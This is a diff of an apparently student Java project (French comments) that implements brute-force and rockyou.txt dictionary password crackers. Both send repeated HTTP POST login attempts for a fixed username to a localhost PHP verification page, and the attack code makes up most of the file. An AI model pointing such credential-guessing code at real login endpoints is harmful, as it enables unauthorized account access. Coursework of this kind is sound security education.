@@ -1,10 +1,11 @@
 import java.io.*;
-import java.io.IOException;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
+import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 public abstract class PasswordCracker {
@@ -33,7 +34,7 @@ public abstract class PasswordCracker {
     protected abstract String getPassword() throws IOException, InterruptedException;
 }
 
-public class BruteForceCracker extends PasswordCracker {
+class BruteForceCracker extends PasswordCracker {
     private boolean passwordFound = false;
 
     @Override
@@ -42,24 +43,17 @@ public class BruteForceCracker extends PasswordCracker {
         return passwordFound;
     }
 
-    private void generatePasswords(String prefix, int length, String password) {
-        if (passwordFound) {
-            return;
-        }
-
-        if (length == 0) {
-            if (prefix.equals(password)) {
-                System.out.println("Le mot de passe est " + prefix);
-                passwordFound = true;
-            }
-            return;
-        }
-
-        for (char c = 'a'; c <= 'z'; c++) {
-            String newPrefix = prefix + c;
-            generatePasswords(newPrefix, length - 1, password);
-        }
+    private void generatePasswords(String prefix, int length, List<String> generatedPasswords) {
+    if (length == 0) {
+        generatedPasswords.add(prefix); // Ajouter le mot de passe généré à la liste
+        return;
     }
+
+    for (char c = 'a'; c <= 'z'; c++) {
+        String newPrefix = prefix + c;
+        generatePasswords(newPrefix, length - 1, generatedPasswords);
+    }
+}
 
     @Override
     protected String getPassword() throws IOException, InterruptedException {
@@ -67,35 +61,31 @@ public class BruteForceCracker extends PasswordCracker {
         HttpClient client = HttpClient.newHttpClient();
 
         // URL
-        String loginUrl = "http://localhost:8888/TP_PC/verification.php";
+        String loginUrl = "http://localhost/TP_PC/verification.php";
 
         // Données d'identification
         Map<String, String> formData = new HashMap<>();
         formData.put("username", "madi");
 
-        
-        for (int length = 1; length <= 10; length++) { 
-            generatePasswords("", length, "");
+        List<String> generatedPasswords = new ArrayList<>();
+
+        for (int length = 1; length <= 4; length++) {
+            generatePasswords("", length, generatedPasswords); 
         }
 
-        
         for (String password : generatedPasswords) {
             formData.put("password", password);
 
-            
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(loginUrl))
                     .header("Content-Type", "application/x-www-form-urlencoded")
                     .POST(buildFormData(formData))
                     .build();
 
-            
             HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
 
-            
             int statusCode = response.statusCode();
             if (statusCode == 200) {
-            
                 return "Authentification réussie 😎!\nLe mot de passe est : " + password;
             }
         }
@@ -103,7 +93,6 @@ public class BruteForceCracker extends PasswordCracker {
         return "Malheureusement, nous n'avons pas pu cracker le mot de passe 😔";
     }
 
-    
     private static HttpRequest.BodyPublisher buildFormData(Map<String, String> data) {
         String formData = data.entrySet().stream()
                 .map(entry -> entry.getKey() + "=" + entry.getValue())
@@ -119,7 +108,7 @@ class DictionaryCracker extends PasswordCracker {
         BufferedReader reader = null;
 
         try {
-            reader = new BufferedReader(new FileReader("../doc/rockyou.txt"));
+            reader = new BufferedReader(new FileReader("C:/Users/Modou/Desktop/Design_paterne-main/src/rockyou.txt"));
             String line;
 
             while ((line = reader.readLine()) != null) {
@@ -137,40 +126,42 @@ class DictionaryCracker extends PasswordCracker {
         return false;
     }
 
-    //methode pour craquer par requette http
-    public String getPassword() throws IOException, InterruptedException{
-    // client HTTP
+    // Méthode pour craquer par requête HTTP
+    public String getPassword() throws IOException, InterruptedException {
+        // Client HTTP
         HttpClient client = HttpClient.newHttpClient();
 
-        // URL 
-        String loginUrl = "http://localhost:8888/TP_PC/verification.php";
+        // URL
+        String loginUrl = "http://localhost/TP_PC/verification.php";
 
-        // données d'identification
+        // Données d'identification
         Map<String, String> formData = new HashMap<>();
         formData.put("username", "madi");
 
         BufferedReader reader = null;
 
         try {
-            reader = new BufferedReader(new FileReader("../doc/rockyou.txt"));
+            reader = new BufferedReader(new FileReader("C:/Users/Modou/Desktop/Design_paterne-main/src/rockyou.txt"));
             String line;
 
             while ((line = reader.readLine()) != null) {
-                 formData.put("password", line);
-                //requête HTTP POST avec les données d'identification
+                formData.put("password", line);
+
+                // Requête HTTP POST avec les données d'identification
                 HttpRequest request = HttpRequest.newBuilder()
-                .uri(URI.create(loginUrl))
-                .header("Content-Type", "application/x-www-form-urlencoded")
-                .POST(buildFormData(formData))
-                .build();
-                // Envoie de la  requête et recuperation de la réponse
+                        .uri(URI.create(loginUrl))
+                        .header("Content-Type", "application/x-www-form-urlencoded")
+                        .POST(buildFormData(formData))
+                        .build();
+
+                // Envoi de la requête et récupération de la réponse
                 HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
-                // le code de retour
+
+                // Code de retour
                 int statusCode = response.statusCode();
                 if (statusCode == 200) {
                     // Authentification réussie
-                    return "Authentification réussie 😎!\n le mot de passe etait :"+line;
-                    
+                    return "Authentification réussie 😎!\nLe mot de passe était : " + line;
                 }
             }
         } finally {
@@ -179,11 +170,9 @@ class DictionaryCracker extends PasswordCracker {
             }
         }
 
-        return "Malheureusement on a pas pue cracker votre le mot de passe😔";
-
+        return "Malheureusement, nous n'avons pas pu cracker le mot de passe 😔";
     }
 
-    // Méthode utilitaire pour construire les données du formulaire
     private static HttpRequest.BodyPublisher buildFormData(Map<String, String> data) {
         String formData = data.entrySet().stream()
                 .map(entry -> entry.getKey() + "=" + entry.getValue())
@@ -191,9 +180,4 @@ class DictionaryCracker extends PasswordCracker {
                 .orElse("");
         return HttpRequest.BodyPublishers.ofString(formData);
     }
-    
-
 }
-
-    
-
